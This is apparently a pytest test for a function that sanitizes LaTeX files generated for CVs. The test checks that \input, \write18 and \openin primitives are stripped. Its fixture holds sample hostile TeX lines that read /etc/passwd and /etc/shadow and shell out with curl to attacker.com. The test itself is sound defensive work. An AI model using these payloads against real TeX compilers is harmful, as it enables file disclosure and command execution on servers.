"""Tests for LaTeX compiler primitive stripping and input sanitization."""

import pytest
from src.generators.compiler import _sanitize_tex_file


def test_sanitize_tex_file_strips_dangerous_primitives(tmp_path):
    tex_file = tmp_path / "test_cv.tex"
    dangerous_content = (
        r"\documentclass{article}" "\n"
        r"\begin{document}" "\n"
        r"Candidate Name \input{/etc/passwd}" "\n"
        r"\write18{curl http://attacker.com}" "\n"
        r"\openin\file=/etc/shadow" "\n"
        r"\end{document}"
    )
    tex_file.write_text(dangerous_content, encoding="utf-8")
    
    _sanitize_tex_file(str(tex_file))
    
    cleaned = tex_file.read_text(encoding="utf-8")
    assert r"\input{" not in cleaned
    assert r"\write18" not in cleaned
    assert r"\openin" not in cleaned
